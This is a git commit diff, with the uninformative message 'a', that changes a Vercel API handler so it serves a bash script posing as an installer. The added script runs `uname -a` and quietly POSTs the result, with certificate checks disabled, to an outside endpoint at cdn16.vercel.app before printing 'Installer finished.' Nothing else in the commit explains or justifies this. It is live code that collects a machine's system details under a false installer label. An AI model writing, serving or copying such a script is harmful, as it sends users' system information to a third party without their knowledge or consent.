b6cd11af1c66463c15bacc5dce0e913364e6f812
wowdog15 <Pumpkinsarecool899@gmail.com>
2025-08-19 20:31:19 -0400

    a

--- api/index.js
+++ api/index.js
@@ -1,11 +1,18 @@
 export default function handler(req, res) {
-  const userAgent = req.headers['user-agent'] || 'Unknown';
   res.setHeader('Content-Type', 'text/plain');
-  const ver = "1.0";
-  const code = 
-  `#!/bin/bash
-  echo "Running installer..."
-  USER_AGENT=$(uname -a)
-  `;
+
+  const code = `#!/bin/bash
+echo "Running installer..."
+
+# Send the local system info to your API
+USER_AGENT=$(uname -a)
+
+curl -s -k -X POST https://cdn16.vercel.app/api/log \\
+     -H "Content-Type: application/json" \\
+     -d "{\\"data\\": \\"$USER_AGENT\\"}"
+
+echo "Installer finished."
+`;
+
   res.status(200).send(code);
 }
